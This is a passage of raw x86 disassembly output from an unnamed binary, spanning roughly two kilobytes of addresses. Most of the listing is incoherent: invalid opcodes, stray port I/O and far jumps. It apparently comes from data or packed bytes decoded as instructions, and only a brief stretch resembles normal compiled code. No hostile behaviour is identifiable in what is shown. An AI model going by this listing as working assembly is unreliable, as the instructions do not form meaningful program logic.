  40f391:	and    eax,0xc8dfe0fd
  40f396:	xchg   edi,eax
  40f397:	xchg   esi,eax
  40f398:	mov    eax,0xd9e2be4c
  40f39d:	cmp    al,0xa8
  40f39f:	mov    ecx,0xd240b9e9
  40f3a4:	pop    eax
  40f3a5:	(bad)  
  40f3a6:	push   ecx
  40f3a7:	mov    edi,0x1ba19a9a
  40f3ac:	ret    0xa47f
  40f3af:	bound  edi,QWORD PTR [edi+0x7da0ba65]
  40f3b5:	push   ebx
  40f3b6:	mov    WORD PTR [esi+0x26f3dcbf],?
  40f3bc:	daa    
  40f3bd:	addr16 push di
  40f3c0:	in     eax,dx
  40f3c1:	stos   BYTE PTR es:[edi],al
  40f3c2:	fst    DWORD PTR [eax-0x11]
  40f3c5:	bound  ebx,QWORD PTR [ebp+0x7a]
  40f3c8:	xchg   ebp,eax
  40f3c9:	jmp    0x2f832f60
  40f3ce:	mov    ebp,0x6386cfa6
  40f3d3:	fsub   st,st(3)
  40f3d5:	pop    ebp
  40f3d6:	xor    BYTE PTR [ecx+0x6cacd7d5],0x2f
  40f3dd:	aaa    
  40f3de:	mov    ah,0x3a
  40f3e0:	scas   al,BYTE PTR es:[edi]
  40f3e1:	test   BYTE PTR [ecx],cl
  40f3e3:	sbb    ch,BYTE PTR [edx+0x10]
  40f3e6:	shl    BYTE PTR [edx-0x5f],1
  40f3e9:	nop
  40f3ea:	and    eax,DWORD PTR [edx-0xaef2f67]
  40f3f0:	push   ebp
  40f3f1:	pop    eax
  40f3f2:	or     esp,DWORD PTR [eax]
  40f3f4:	cmp    al,0x31
  40f3f6:	icebp  
  40f3f7:	dec    esi
  40f3f8:	jno    0x40f3aa
  40f3fa:	retf   0xd293
  40f3fd:	ficomp DWORD PTR [ebp+0x87fb8ef]
  40f403:	add    al,0x77
  40f405:	add    BYTE PTR [ecx+0x43],0xcf
  40f409:	push   ds
  40f40a:	push   es
  40f40b:	pop    ss
  40f40c:	xchg   ecx,eax
  40f40d:	pushf  
  40f40e:	xor    cl,bl
  40f410:	out    dx,eax
  40f411:	call   0x2887478e
  40f416:	push   edx
  40f417:	div    BYTE PTR [eax]
  40f419:	jg     0x40f45e
  40f41b:	imul   ebp,esp,0xffffff9b
  40f41e:	ret    0x6578
  40f421:	in     eax,0xe2
  40f423:	jo     0x40f3ba
  40f425:	mov    esp,DWORD PTR [edx]
  40f427:	test   BYTE PTR [ebx+eax*8-0x7c],0x97
  40f42c:	sbb    ah,BYTE PTR cs:[edx-0x27]
  40f430:	aam    0x72
  40f432:	xor    BYTE PTR [esp+eiz*4+0x15],bh
  40f436:	and    BYTE PTR [ecx-0x7c865462],0xca
  40f43d:	mov    esi,DWORD PTR [ebx+0x1a]
  40f440:	xchg   edi,eax
  40f441:	clc    
  40f442:	sbb    DWORD PTR [esi+edi*8+0x52],0x5c
  40f447:	add    eax,0xcd2ad1d9
  40f44c:	xor    edi,edi
  40f44e:	mov    esi,0xf37a35db
  40f453:	pop    esi
  40f454:	shrd   DWORD PTR [ebx],eax,cl
  40f457:	push   edx
  40f458:	inc    ecx
  40f459:	push   es
  40f45a:	imul   ebx,DWORD PTR [ebx-0x73],0x5e
  40f45e:	lds    esp,FWORD PTR [esi+0x43530509]
  40f464:	and    DWORD PTR [edi-0x13],0x62369260
  40f46b:	push   ebp
  40f46c:	push   0xffffffe9
  40f46e:	cdq    
  40f46f:	in     eax,dx
  40f470:	push   0xb26c9a76
  40f475:	nop
  40f476:	mov    ah,0x85
  40f478:	loop   0x40f430
  40f47a:	les    edx,FWORD PTR [ebp-0x14163136]
  40f480:	rcr    DWORD PTR [eax+0x3cf7cb58],1
  40f486:	mov    edi,0x31d3ad66
  40f48b:	nop
  40f48c:	icebp  
  40f48d:	cmc    
  40f48e:	sbb    al,0x33
  40f490:	(bad)  
  40f492:	bound  ebx,QWORD PTR [ecx+0x20]
  40f495:	das    
  40f496:	jo     0x40f50d
  40f498:	push   edi
  40f499:	sub    esp,ebp
  40f49b:	rcr    DWORD PTR [esi+0xfd2024d],1
  40f4a1:	cmp    al,0x7a
  40f4a3:	pop    ecx
  40f4a4:	mov    ebx,0xde306023
  40f4a9:	(bad)  
  40f4aa:	icebp  
  40f4ab:	pusha  
  40f4ac:	sub    BYTE PTR [ebp-0x70a5c61c],al
  40f4b2:	jmp    0x4afd:0x123d6c0f
  40f4b9:	cmp    dl,BYTE PTR [esi+0x29]
  40f4bc:	das    
  40f4bd:	xchg   ebp,eax
  40f4be:	jmp    0xf5bf:0xf9453683
  40f4c5:	mov    edx,0x5c94690d
  40f4ca:	sbb    al,0xd9
  40f4cc:	and    al,0xbd
  40f4ce:	repnz cmp DWORD PTR [edi+0x26],edi
  40f4d2:	test   DWORD PTR [ecx],ecx
  40f4d4:	inc    eax
  40f4d5:	jne    0x40f46e
  40f4d7:	jg     0x40f473
  40f4d9:	push   ebp
  40f4da:	or     DWORD PTR [edi-0x6fd82625],esp
  40f4e0:	xchg   ecx,eax
  40f4e1:	and    dl,BYTE PTR [edx-0x41621743]
  40f4e7:	iret   
  40f4e8:	cmp    ah,BYTE PTR [edx+ebp*1+0x67]
  40f4ec:	mov    ah,0x6f
  40f4ee:	dec    ecx
  40f4ef:	mov    BYTE PTR [esi+0x1f],ch
  40f4f2:	lods   al,BYTE PTR ds:[esi]
  40f4f3:	xchg   ecx,eax
  40f4f4:	scas   al,BYTE PTR es:[edi]
  40f4f5:	int    0xcc
  40f4f7:	mov    ah,0x7a
  40f4f9:	or     al,0x81
  40f4fb:	popa   
  40f4fc:	inc    ebx
  40f4fd:	in     eax,dx
  40f4fe:	test   eax,0x7bb193a4
  40f503:	sbb    cl,BYTE PTR [edx-0x3f]
  40f506:	xchg   BYTE PTR [ebp+0x2e],bh
  40f509:	dec    esp
  40f50a:	mov    DWORD PTR [ebx+esi*1-0x13b2760a],eax
  40f511:	mov    eax,DWORD PTR [ebp-0x28]
  40f514:	jmp    0x40f908
  40f519:	sbb    al,0x75
  40f51b:	sar    DWORD PTR [esi+0x71b35a51],1
  40f521:	lahf   
  40f522:	popa   
  40f523:	sti    
  40f524:	arpl   WORD PTR [edi-0x49e18813],si
  40f52a:	scas   eax,DWORD PTR es:[edi]
  40f52b:	jo     0x40f59d
  40f52d:	dec    ecx
  40f52e:	jge    0x40f5a0
  40f530:	jo     0x40f4c5
  40f532:	and    eax,0xbf389ab6
  40f537:	xor    al,0xb4
  40f539:	into   
  40f53a:	rcr    DWORD PTR [esi],0xe3
  40f53d:	mov    al,0x24
  40f53f:	enter  0x609e,0xd0
  40f543:	mov    ch,BYTE PTR [eax-0xcd2eda8]
  40f549:	mov    WORD PTR [edi-0x70e10cc3],gs
  40f54f:	inc    edx
  40f550:	ins    BYTE PTR es:[edi],dx
  40f551:	into   
  40f552:	push   esp
  40f553:	lds    ebp,FWORD PTR [edx+0x7ae71480]
  40f559:	shr    BYTE PTR [eax+0x707082c9],cl
  40f55f:	sub    eax,0xe6e0b0bc
  40f564:	xchg   ebp,eax
  40f565:	cld    
  40f566:	jo     0x40f52c
  40f568:	jb     0x40f585
  40f56a:	mov    ebp,0x59429e01
  40f56f:	sub    ecx,DWORD PTR [ebp-0x2c714c21]
  40f575:	outs   dx,DWORD PTR ds:[esi]
  40f576:	lock call 0x191b:0xa2581ffd
  40f57e:	and    al,0x12
  40f580:	lods   al,BYTE PTR ds:[esi]
  40f581:	pop    ss
  40f582:	sbb    eax,0x38
  40f585:	fidiv  WORD PTR [eax+eax*4]
  40f588:	adc    eax,0xff6b30d6
  40f58d:	mov    dl,0xed
  40f58f:	rcr    BYTE PTR [ebx-0x6a],0x56
  40f593:	outs   dx,BYTE PTR ds:[esi]
  40f594:	pop    esp
  40f595:	sub    DWORD PTR [esi-0x71e42f1b],edx
  40f59b:	push   ecx
  40f59c:	fild   DWORD PTR [ebp-0x7d692c4b]
  40f5a2:	cmp    eax,0xa3bb8bb4
  40f5a7:	cli    
  40f5a8:	jmp    0x77d5ff03
  40f5ad:	cwde   
  40f5ae:	rol    ebp,cl
  40f5b0:	out    dx,al
  40f5b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5b2:	cmp    al,0xec
  40f5b4:	xor    DWORD PTR [ecx-0x75],esi
  40f5b7:	sbb    ebp,DWORD PTR [ecx+0x5a52d774]
  40f5bd:	mov    bh,cl
  40f5bf:	add    BYTE PTR [esi-0x7067a481],0xcc
  40f5c6:	repnz retf 0x7445
  40f5ca:	loopne 0x40f5d5
  40f5cc:	add    ecx,DWORD PTR ds:0xbc098f0f
  40f5d2:	call   0xbc5b:0xccd4bc73
  40f5d9:	xor    eax,0x3b0c863f
  40f5de:	dec    ebp
  40f5df:	outs   dx,BYTE PTR ds:[esi]
  40f5e0:	data16 loopne 0x40f579
  40f5e3:	jb     0x40f65f
  40f5e5:	pop    edx
  40f5e6:	xor    esi,DWORD PTR [esi+ebp*8-0xbe55496]
  40f5ed:	iret   
  40f5ee:	in     eax,0xb0
  40f5f0:	and    eax,0xb2bc57f0
  40f5f5:	jle    0x4b185b30
  40f5fb:	das    
  40f5fc:	out    0xb9,al
  40f5fe:	jge    0x40f5dd
  40f600:	add    dl,BYTE PTR [esp+ecx*8+0x6]
  40f604:	mov    bh,BYTE PTR [ebx+0x21981594]
  40f60a:	push   edi
  40f60b:	rcl    ecx,cl
  40f60d:	sub    ecx,DWORD PTR [edi+0x180d6dfa]
  40f613:	adc    cl,bl
  40f615:	jecxz  0x40f66c
  40f617:	fld    TBYTE PTR [ebx-0x28d7a29c]
  40f61d:	test   BYTE PTR [ebp-0xfa8ad22],ah
  40f623:	jae    0x40f61c
  40f625:	inc    edx
  40f626:	aas    
  40f627:	xor    ebp,DWORD PTR [esp+ebx*8+0x479775a2]
  40f62e:	aam    0x2b
  40f630:	pop    esp
  40f631:	mov    ah,BYTE PTR [ecx+0x8d069e]
  40f637:	push   ecx
  40f638:	into   
  40f639:	scas   al,BYTE PTR es:[edi]
  40f63a:	push   eax
  40f63b:	std    
  40f63c:	jb     0x40f6ab
  40f63e:	stos   BYTE PTR es:[edi],al
  40f63f:	push   edx
  40f640:	sbb    eax,0xc481e83d
  40f645:	bound  ebp,QWORD PTR [edx-0x3368c05b]
  40f64b:	jmp    0x9211:0xd619fff3
  40f652:	in     eax,dx
  40f653:	in     eax,0xbf
  40f655:	imul   edi,DWORD PTR [esi+esi*2+0x36],0xffffffec
  40f65a:	ins    BYTE PTR es:[edi],dx
  40f65b:	shr    BYTE PTR [ebx-0x43],0xdf
  40f65f:	shl    BYTE PTR [edi],0x11
  40f662:	or     ah,BYTE PTR [esi]
  40f664:	mov    ch,0xd3
  40f666:	das    
  40f667:	mov    bl,0x3b
  40f669:	mov    ds:0x37f243f6,al
  40f66e:	mov    DWORD PTR [ecx-0x29418c6b],ebx
  40f674:	aam    0xf7
  40f676:	aaa    
  40f677:	scas   eax,DWORD PTR es:[edi]
  40f678:	mov    eax,ds:0x327c27f4
  40f67d:	imul   esp,eax,0x1e7517a
  40f683:	dec    ebx
  40f684:	and    ah,bh
  40f686:	cdq    
  40f687:	popf   
  40f688:	outs   dx,DWORD PTR ds:[esi]
  40f689:	add    esp,esp
  40f68b:	mov    BYTE PTR [ebp+0xf],cl
  40f68e:	sub    ebp,DWORD PTR [edx-0x3433872f]
  40f694:	pop    esp
  40f695:	pop    esi
  40f696:	adc    ebp,0xffffffea
  40f699:	outs   dx,BYTE PTR ds:[esi]
  40f69a:	jp     0x40f6d6
  40f69c:	jle    0x40f6eb
  40f69e:	mov    WORD PTR [eax],cs
  40f6a0:	and    esi,DWORD PTR ds:0x3680bb4c
  40f6a6:	fcom   DWORD PTR [esi]
  40f6a8:	call   0x7d2c7b1
  40f6ad:	jae    0x40f638
  40f6af:	adc    edx,DWORD PTR [edi+0x3]
  40f6b2:	pop    ds
  40f6b3:	sar    DWORD PTR [eax+0x38],1
  40f6b6:	jnp    0x40f66f
  40f6b8:	jnp    0xf07c6985
  40f6be:	jns    0x40f6ee
  40f6c0:	stos   BYTE PTR es:[edi],al
  40f6c1:	push   0x2c
  40f6c3:	sbb    eax,0x9b20c5b2
  40f6c8:	push   cs
  40f6c9:	push   eax
  40f6ca:	push   ss
  40f6cb:	xchg   DWORD PTR [edi-0xd],ebx
  40f6ce:	not    edi
  40f6d0:	lds    ecx,FWORD PTR [esi+0x7257ea9f]
  40f6d6:	add    al,0x4d
  40f6d8:	lods   eax,DWORD PTR ds:[esi]
  40f6d9:	in     al,0xf3
  40f6db:	push   0x4c
  40f6dd:	stos   DWORD PTR es:[edi],eax
  40f6de:	xor    esp,DWORD PTR [edx+0x459f8047]
  40f6e4:	enter  0x2fd,0xe5
  40f6e8:	das    
  40f6e9:	loopne 0x40f6a3
  40f6eb:	mov    eax,ds:0x89bdc30
  40f6f0:	dec    eax
  40f6f1:	xchg   ebx,eax
  40f6f2:	call   0xe817d386
  40f6f7:	loopne 0x40f6bb
  40f6f9:	lock sub ch,dl
  40f6fc:	push   ss
  40f6fd:	stos   DWORD PTR es:[edi],eax
  40f6fe:	fmul   DWORD PTR [esp+edi*1]
  40f701:	clc    
  40f702:	add    DWORD PTR [edx+0x644c3b65],esp
  40f708:	push   edi
  40f709:	mov    dl,0x32
  40f70b:	mov    cl,ah
  40f70d:	inc    eax
  40f70e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f70f:	cmp    ecx,DWORD PTR [edi+0xb]
  40f712:	xchg   cl,cl
  40f714:	scas   eax,DWORD PTR es:[edi]
  40f715:	repz call 0xc0f6:0xd448ef4
  40f71d:	in     eax,0x32
  40f71f:	sbb    BYTE PTR [ecx-0x2de39c5c],cl
  40f725:	out    0x44,al
  40f727:	ret    
  40f728:	iret   
  40f729:	data16 jecxz 0x40f6f5
  40f72c:	loop   0x40f757
  40f72e:	jge    0x40f75d
  40f730:	aas    
  40f731:	jae    0x40f6f5
  40f733:	dec    ebp
  40f734:	add    ecx,DWORD PTR [ebp-0x11]
  40f737:	pop    esi
  40f738:	pop    es
  40f739:	outs   dx,DWORD PTR ds:[esi]
  40f73a:	ficom  DWORD PTR [ebp+0x61]
  40f73d:	adc    al,0x75
  40f73f:	ins    DWORD PTR es:[edi],dx
  40f740:	shl    BYTE PTR [ebx+0x1acb86e6],0x8b
  40f747:	sti    
  40f748:	inc    esi
  40f749:	pusha  
  40f74a:	mov    esi,0x5bc7d0fe
  40f74f:	sbb    dl,ch
  40f751:	(bad)  
  40f752:	pop    esp
  40f753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f754:	adc    eax,0x608d3ae6
  40f759:	icebp  
  40f75a:	out    0xb8,al
  40f75c:	int    0xf7
  40f75e:	lahf   
  40f75f:	fstp   QWORD PTR [ebx]
  40f761:	jb     0x40f710
  40f763:	mov    ds:0x5df50a7a,eax
  40f768:	je     0x40f760
  40f76a:	mov    ebp,0xd1b23ae2
  40f76f:	inc    BYTE PTR [eax+0x8]
  40f772:	inc    esi
  40f773:	(bad)  
  40f774:	lock mov ecx,DWORD PTR [edx+0x3d]
  40f778:	mov    edx,0xae857290
  40f77d:	sti    
  40f77e:	push   cs
  40f77f:	and    BYTE PTR [eax-0xd5125df],dl
  40f785:	bound  esi,QWORD PTR [esp+eiz*8+0x23177832]
  40f78c:	rol    BYTE PTR [ebx],cl
  40f78e:	dec    edi
  40f78f:	adc    eax,DWORD PTR es:[ebp-0x62]
  40f793:	lock shl BYTE PTR [edi-0x19],cl
  40f797:	inc    esp
  40f798:	xor    ebp,DWORD PTR [ecx-0x43c6d57d]
  40f79e:	and    cl,0xdb
  40f7a1:	and    al,0x4c
  40f7a3:	repnz fild QWORD PTR [edx+0x31b18730]
  40f7aa:	out    0xf0,al
  40f7ac:	daa    
  40f7ad:	popf   
  40f7ae:	cmc    
  40f7af:	inc    edi
  40f7b0:	and    BYTE PTR [edx],bl
  40f7b2:	stos   DWORD PTR es:[edi],eax
  40f7b3:	inc    esi
  40f7b4:	es lahf 
  40f7b6:	mov    eax,0x747bffa1
  40f7bb:	and    BYTE PTR [edi+0x44],al
  40f7be:	fst    QWORD PTR [edx]
  40f7c0:	xchg   DWORD PTR [edi+0x7d],esi
  40f7c3:	add    DWORD PTR [edi+ebx*4-0x16],eax
  40f7c7:	sub    eax,0xb4606c44
  40f7cc:	mov    esi,DWORD PTR [eax-0x1c]
  40f7cf:	jne    0x40f7ce
  40f7d1:	mov    ch,0xf7
  40f7d3:	shr    DWORD PTR [esi],0xf3
  40f7d6:	in     al,dx
  40f7d7:	sub    al,BYTE PTR [ebx+0x7b]
  40f7da:	les    esi,FWORD PTR [ebx]
  40f7dc:	aad    0x44
  40f7de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7df:	inc    ecx
  40f7e0:	addr16 ret 0x273c
  40f7e4:	outs   dx,BYTE PTR ds:[esi]
  40f7e5:	inc    eax
  40f7e6:	push   cs
  40f7e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7e8:	xchg   ecx,eax
  40f7e9:	jle    0x40f79b
  40f7eb:	dec    ebp
  40f7ec:	sbb    BYTE PTR [edi-0x19d62345],cl
  40f7f2:	(bad)  [ebx+ebx*2]
  40f7f5:	jns    0x40f7fb
  40f7f7:	in     al,0x13
  40f7f9:	mov    eax,0x1cf40af5
  40f7fe:	(bad)  
  40f7ff:	xor    eax,0xa6646b7f
  40f804:	sbb    DWORD PTR [esi+0x17959b04],0x18eef597
  40f80e:	scas   eax,DWORD PTR es:[edi]
  40f80f:	sub    DWORD PTR [edx+0x70e552cd],esi
  40f815:	mov    dl,0x6b
  40f817:	cmp    bh,BYTE PTR [eax+0x1f]
  40f81a:	call   FWORD PTR [edx+ebx*8-0x8]
  40f81e:	in     al,0x5e
  40f820:	sub    eax,0x86161dbf
  40f825:	xor    al,0xfc
  40f827:	xchg   ebp,eax
  40f828:	xor    dl,BYTE PTR [esi-0x1]
  40f82b:	mov    BYTE PTR [ebx+0x172c1a7],ah
  40f831:	aam    0x4e
  40f833:	cwde   
  40f834:	je     0x40f7e6
  40f836:	cmp    eax,DWORD PTR [edx+0x77f88bbc]
  40f83c:	je     0x40f828
  40f83e:	(bad)  
  40f83f:	xor    DWORD PTR [edx+eax*8-0x2220f8fa],edx
  40f846:	cwde   
  40f847:	(bad)  
  40f848:	sub    dl,BYTE PTR [ecx*2-0x6632e5ff]
  40f84f:	mov    BYTE PTR [edi+eax*1-0x2401e8c0],bl
  40f856:	fcom   QWORD PTR [eax+0x7d]
  40f859:	out    0x49,al
  40f85b:	xchg   esi,eax
  40f85c:	sub    DWORD PTR [eax],eax
  40f85e:	jns    0x40f8b3
  40f860:	gs icebp 
  40f862:	pop    edi
  40f863:	jmp    0xfd54:0x52dedcdd
  40f86a:	jg     0x40f852
  40f86c:	ret    0xf10c
  40f86f:	push   DWORD PTR ds:0xdb0cd19f
  40f875:	adc    edx,DWORD PTR [eax-0x1d213cdc]
  40f87b:	or     DWORD PTR [edi],0x31
  40f87e:	scas   eax,DWORD PTR es:[edi]
  40f87f:	push   ecx
  40f880:	inc    esp
  40f881:	pop    es
  40f882:	jmp    0x40f8a5
  40f884:	aaa    
  40f885:	clc    
  40f886:	jb     0x40f85f
  40f888:	fs xchg ebx,eax
  40f88a:	arpl   si,sp
  40f88c:	in     eax,0xba
  40f88e:	cmp    al,0x7f
  40f890:	dec    ebp
  40f891:	mov    esi,0xf74a499d
  40f896:	out    dx,eax
  40f897:	jo     0x40f83a
  40f899:	inc    BYTE PTR [eax]
  40f89b:	dec    edx
  40f89c:	mov    ebp,0x963ab65e
  40f8a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8a2:	xor    al,0x15
  40f8a4:	push   ecx
  40f8a5:	jae    0x40f888
  40f8a7:	(bad)  
  40f8a8:	das    
  40f8a9:	lds    edx,FWORD PTR [ebx+0x51]
  40f8ac:	mov    eax,ds:0xf4c3918d
  40f8b1:	fmulp  st(5),st
  40f8b3:	pop    sp
  40f8b5:	jp     0x40f8d4
  40f8b7:	cs cwde 
  40f8b9:	or     al,BYTE PTR [ebx+0x4b420f16]
  40f8bf:	in     al,dx
  40f8c0:	loopne 0x40f86e
  40f8c2:	jns    0x40f907
  40f8c4:	jo     0x40f8a6
  40f8c6:	pop    esi
  40f8c7:	mov    ecx,ss
  40f8c9:	cmp    al,0x3d
  40f8cb:	aaa    
  40f8cc:	icebp  
  40f8cd:	int3   
  40f8ce:	cmp    al,0x21
  40f8d0:	xor    eax,0xe27222e9
  40f8d5:	xor    DWORD PTR [eax+0x18d5e502],esp
  40f8db:	jne    0x40f94a
  40f8dd:	pop    ebp
  40f8de:	push   edx
  40f8df:	idiv   BYTE PTR [esi-0x1c3f0477]
  40f8e5:	fs sbb ch,0xb8
  40f8e9:	mov    al,ds:0xb9d8bc59
  40f8ee:	jo     0x40f945
  40f8f0:	aas    
  40f8f1:	push   eax
  40f8f2:	mov    edi,edx
  40f8f4:	adc    al,0x78
  40f8f6:	bound  esi,QWORD PTR [ebx-0x5]
  40f8f9:	xchg   ebx,eax
  40f8fa:	push   esi
  40f8fb:	std    
  40f8fc:	push   ds
  40f8fd:	dec    ecx
  40f8fe:	je     0x40f92c
  40f900:	xor    al,dh
  40f902:	jbe    0x40f907
  40f904:	or     ebp,DWORD PTR [esi+0x4d8bc64a]
  40f90a:	or     BYTE PTR [ebx],al
  40f90c:	or     al,0xb8
  40f90e:	lea    eax,[ebp-0x8]
  40f911:	mov    DWORD PTR [ebp-0x30],ecx
  40f914:	push   eax
  40f915:	push   DWORD PTR [ebp-0x30]
  40f918:	push   DWORD PTR [ebp+0xc]
  40f91b:	call   0x403925
  40f920:	mov    eax,DWORD PTR [ebp-0x4]
  40f923:	mov    ecx,DWORD PTR [ebp-0x8]
  40f926:	jmp    0x40fd1a
  40f92b:	or     DWORD PTR ds:[edi],eax
  40f92e:	(bad)  
  40f92f:	rcl    edx,cl
  40f931:	cmp    DWORD PTR [ecx],edx
  40f933:	pop    ecx
  40f934:	jns    0x40f901
  40f936:	popa   
  40f937:	out    0xf4,eax
  40f939:	stos   DWORD PTR es:[edi],eax
  40f93a:	in     al,dx
  40f93b:	(bad)  
  40f93c:	stos   DWORD PTR es:[edi],eax
  40f93d:	jo     0x40f9af
  40f93f:	dec    ecx
  40f940:	jge    0x40f9b2
  40f942:	jo     0x40f8ee
  40f944:	xor    edi,DWORD PTR [ecx-0x5d]
  40f947:	pushf  
  40f948:	add    eax,0x72e4ca64
  40f94d:	mov    esp,0x3664911d
  40f952:	in     eax,0x43
  40f954:	sub    DWORD PTR [edx-0x60c7d390],esp
  40f95a:	imul   esi,esi,0xffffffd4
  40f95d:	mov    ecx,0x883b1303
  40f962:	mov    ebx,0x78005004
  40f967:	sbb    ah,al
  40f969:	enter  0x291d,0x3e
  40f96d:	ja     0x40f93d
  40f96f:	add    BYTE PTR [edx-0x3550fec1],ah
  40f975:	xchg   edx,eax
  40f976:	lock jp 0x40f923
  40f979:	mov    ds:0x756006d1,al
  40f97e:	cwde   
  40f97f:	mov    edi,0x4fa825a1
  40f984:	xchg   esp,eax
  40f985:	mov    cl,0xec
  40f987:	sbb    DWORD PTR [ebp-0x30],ebx
  40f98a:	jle    0x40f9d2
  40f98c:	or     DWORD PTR [edi+eiz*1-0x2dd7e44],ebx
  40f993:	dec    ecx
  40f994:	push   ds
  40f995:	sub    ebx,DWORD PTR [ecx+0x5a454940]
  40f99b:	jmp    0xd0a4:0xde46194e
  40f9a2:	cmp    edi,DWORD PTR ds:0x9acaddfd
  40f9a8:	sbb    dl,BYTE PTR [esi+0x26]
  40f9ab:	and    eax,0xf8901477
  40f9b0:	aas    
  40f9b1:	bound  edx,QWORD PTR [esi-0x4d5b2e20]
  40f9b7:	dec    eax
  40f9b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9b9:	xchg   esp,eax
  40f9ba:	int3   
  40f9bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9bc:	test   DWORD PTR [edx-0x7e42ce9e],ebx
  40f9c2:	jl     0x40fa10
  40f9c4:	adc    ch,dl
  40f9c6:	(bad)  
  40f9c7:	js     0x40fa24
  40f9c9:	push   edi
  40f9ca:	out    dx,al
  40f9cb:	hlt    
  40f9cc:	fstp   DWORD PTR [edi-0x2026fad]
  40f9d2:	sub    BYTE PTR [edi+ebx*8+0x7e006709],dh
  40f9d9:	retf   0xf422
  40f9dc:	(bad)  
  40f9de:	repnz aas 
  40f9e0:	add    eax,DWORD PTR cs:[esi]
  40f9e3:	mov    ecx,0x3a5d992e
  40f9e8:	sub    DWORD PTR [ebp+0x12a100a2],esi
  40f9ee:	out    0xe1,al
  40f9f0:	(bad)  
  40f9f1:	pop    esp
  40f9f2:	xchg   ebx,eax
  40f9f3:	fisttp WORD PTR [edx]
  40f9f5:	jl     0x40f9a2
  40f9f7:	sub    BYTE PTR [ebx+0x52],dh
  40f9fa:	stos   BYTE PTR es:[edi],al
  40f9fb:	or     BYTE PTR [ecx+0x4914860b],bh
  40fa01:	jmp    0xd9ab8b2
  40fa06:	cli    
  40fa07:	(bad)  
  40fa08:	jbe    0x40fa36
  40fa0a:	mov    esp,0x5f9b12ed
  40fa0f:	push   ebx
  40fa10:	loope  0x40f9dc
  40fa12:	sub    al,0xe1
  40fa14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa15:	sbb    ebp,DWORD PTR [ebp-0x3]
  40fa18:	inc    al
  40fa1a:	out    dx,eax
  40fa1b:	cmp    DWORD PTR [ecx],0x5c0c6f18
  40fa21:	enter  0x20ab,0xb3
  40fa25:	mov    ebp,0x777b945a
  40fa2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa2b:	jl     0x40fa24
  40fa2d:	dec    BYTE PTR [eax]
  40fa2f:	fstp   QWORD PTR [ebp-0x4]
  40fa32:	inc    BYTE PTR [ecx]
  40fa34:	stos   DWORD PTR es:[edi],eax
  40fa35:	dec    ebx
  40fa36:	icebp  
  40fa37:	cmc    
  40fa38:	cld    
  40fa39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa3a:	push   edx
  40fa3b:	pop    ebp
  40fa3c:	push   es
  40fa3d:	xor    esp,DWORD PTR [ebx]
  40fa3f:	(bad)  
  40fa40:	iret   
  40fa41:	push   cs
  40fa42:	stos   BYTE PTR es:[edi],al
  40fa43:	and    al,0xe1
  40fa45:	(bad)  
  40fa46:	loopne 0x40fa51
  40fa48:	sub    al,0xff
  40fa4a:	dec    eax
  40fa4b:	arpl   si,sp
  40fa4d:	jae    0x40f9f7
  40fa4f:	and    BYTE PTR [ecx-0x3],dh
  40fa52:	sbb    DWORD PTR [edi],esp
  40fa54:	out    dx,al
  40fa55:	stos   DWORD PTR es:[edi],eax
  40fa56:	mov    bl,0xd8
  40fa58:	bound  esi,QWORD PTR [edx]
  40fa5a:	sti    
  40fa5b:	scas   al,BYTE PTR es:[edi]
  40fa5c:	cdq    
  40fa5d:	aas    
  40fa5e:	pusha  
  40fa5f:	push   0x28348cc8
  40fa64:	lods   al,BYTE PTR ds:[esi]
  40fa65:	loopne 0x40f9f6
  40fa67:	(bad)  
  40fa68:	fadd   QWORD PTR [esi+0x35]
  40fa6b:	loop   0x40fadc
  40fa6d:	ror    DWORD PTR [esi-0x3a],cl
  40fa70:	xor    dl,ch
  40fa72:	(bad)  
  40fa73:	cld    
  40fa74:	sar    DWORD PTR [edx+0x7e172cf2],cl
  40fa7a:	push   eax
  40fa7b:	cwde   
  40fa7c:	out    dx,eax
  40fa7d:	cmp    ebx,DWORD PTR [ebx+0x3b6b23c8]
  40fa83:	jnp    0x40fad7
  40fa85:	mov    WORD PTR [edx],gs
  40fa87:	cwde   
  40fa88:	fst    QWORD PTR [ebx-0x3b46092b]
  40fa8e:	add    DWORD PTR [ebp+0x63],ecx
  40fa91:	lods   eax,DWORD PTR ds:[esi]
  40fa92:	div    DWORD PTR [ecx-0x7c0be19a]
  40fa98:	sbb    esi,DWORD PTR [ecx]
  40fa9a:	cmp    eax,0xc2f598a1
  40fa9f:	(bad)  
  40faa0:	lods   al,BYTE PTR ds:[esi]
  40faa1:	jno    0x40fb07
  40faa3:	pop    ebp
  40faa4:	xchg   ecx,eax
  40faa5:	fldcw  WORD PTR [ecx-0x6]
  40faa8:	and    eax,0xfecac343
  40faad:	and    DWORD PTR [edi],edx
  40faaf:	xor    al,0xf1
  40fab1:	jecxz  0x40fa92
  40fab3:	das    
  40fab4:	pop    ebp
  40fab5:	ins    DWORD PTR es:[edi],dx
  40fab6:	xchg   esp,eax
  40fab7:	push   ss
  40fab8:	cld    
  40fab9:	cwde   
  40faba:	fldenv [edi+eiz*8+0x50]
  40fabe:	stos   BYTE PTR es:[edi],al
  40fabf:	jge    0x40fb33
  40fac1:	jmp    0x49bd550a
  40fac6:	pop    esi
  40fac7:	pop    eax
  40fac8:	sub    ebx,DWORD PTR [ebx]
  40faca:	jae    0x40faf1
  40facc:	das    
  40facd:	stc    
  40face:	jbe    0x40faa2
  40fad0:	pop    ss
  40fad1:	iret   
  40fad2:	adc    eax,0x88d1fba
  40fad7:	and    BYTE PTR [ebx],al
  40fad9:	mov    eax,ds:0x92282e20
  40fade:	fadd   DWORD PTR [eax]
  40fae0:	xor    eax,DWORD PTR [ebx+ecx*2-0x50e0a037]
  40fae7:	rcr    BYTE PTR [ebx-0x4a],cl
  40faea:	scas   eax,DWORD PTR es:[edi]
  40faeb:	mov    edx,0xccd8e136
  40faf0:	xchg   ebx,eax
  40faf1:	add    al,0x7
  40faf3:	xor    ebx,eax
  40faf5:	mov    ds:0xd97250c4,al
  40fafa:	daa    
